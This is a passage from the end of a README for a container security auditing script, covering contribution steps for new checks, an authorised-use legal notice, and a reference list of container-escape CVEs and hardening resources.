      -d "$finding"
  done
```

---

## Contributing

Pull requests are welcome. When adding a new check, follow the existing pattern:

1. Add a `check_<name>()` function
2. Call `add_finding` with all seven fields: id, severity, title, what, impact, exploitability, recommendation
3. Register the function call in the MAIN section
4. Update this README's checks table

---

## Legal

This tool is provided for **authorised security testing only**. Running it against systems without explicit written permission from the system owner may be illegal in your jurisdiction. The authors accept no liability for misuse.

Copyright © Liam Romanis. All rights reserved. This project is source-available for review and non-commercial use. Commercial use requires explicit written permission from the author. See [LICENSE](LICENSE) for full terms.

---

## References

- [Linux Capabilities man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [GTFOBins — SUID binary exploitation](https://gtfobins.github.io/)
- [Kubernetes Pod Security Admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [CVE-2026-31431 Copy Fail — Wikipedia](https://en.wikipedia.org/wiki/Copy_Fail)
- [CVE-2026-31431 Copy Fail — CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [CVE-2025-23266 NVIDIAScape — Wiz Research](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape)
- [CVE-2025-31133 runc masked path — CNCF](https://www.cncf.io/blog/2025/11/28/runc-container-breakout-vulnerabilities-a-technical-overview/)
- [CVE-2022-0847 DirtyPipe](https://dirtypipe.cm4all.com/)
- [CVE-2019-5736 runc escape](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
- [Felix Wilhelm's cgroup release_agent PoC](https://twitter.com/_fel1x/status/1151487051986087936)
- [deepce — Docker Enumeration, Escalation of Privileges and Container Escapes](https://github.com/stealthcopter/deepce)
- [CDK — Container penetration toolkit](https://github.com/cdk-team/CDK)
- [Trail of Bits — Understanding and Hardening Linux Containers](https://github.com/trailofbits/publications/blob/master/papers/understanding_hardening_linux_containers.pdf)
